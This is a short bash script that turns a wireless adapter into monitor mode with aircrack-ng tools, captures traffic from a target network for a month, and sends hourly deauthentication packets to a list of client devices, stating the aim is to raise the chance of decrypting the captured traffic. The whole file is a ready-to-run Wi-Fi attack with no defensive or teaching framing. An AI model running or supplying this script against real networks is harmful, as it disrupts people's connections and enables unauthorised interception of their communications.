#! /bin/bash

if [ "$EUID" -ne 0 ]
  then echo "Run as root."
  exit
fi

network_target=$(<network-target.txt)
targets="targets.txt" 
duration=$((SECONDS+2592000))

# Kill all network processes
echo "Killing network processes."
airmon-ng check kill
sleep 5

# Start our network adapter in monitor mode channel 1
echo "Initializing capture card."
airmon-ng stop wlx
sleep 5
airmon-ng start wlx 1
sleep 5

# Start capture
echo "Capture started..."
screen -d -m airodump-ng wlx --bssid $network_target -c 1 -w Captures/month-capture &
sleep 5

# Deauth every hour until a month has passed to increase the chances we can decrypt traffic
while [ $SECONDS -lt $duration ]; do
    while read target; do
        echo "Deauthing..."
        aireplay-ng --deauth 1 -a $network_target -c $target wlx
    done < $targets
sleep 3600
done

echo "Capture complete."
trap "killall background" EXIT
